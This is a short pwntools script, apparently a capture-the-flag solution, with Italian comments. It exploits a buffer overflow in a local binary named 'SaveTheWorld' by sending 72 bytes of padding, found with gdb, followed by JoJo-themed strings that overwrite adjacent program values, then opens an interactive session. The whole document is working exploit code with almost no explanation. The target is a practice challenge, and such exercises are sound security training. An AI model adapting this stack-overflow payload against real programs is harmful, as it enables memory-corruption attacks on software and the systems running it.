from pwn import *

p = process('./SaveTheWorld')

garbage = b'a' * 72 #ho trovato l'offset uguale a 72 con gdb
#informazioni trovate tra il codice
fighter = b'Jotaro!!'
fighter_stand = b'Star Platinum!!!'
stand_move = b'HORA'
attacks = b'9999'

msgin = garbage + fighter + fighter_stand + stand_move + attacks

p.sendline(msgin)
p.interactive()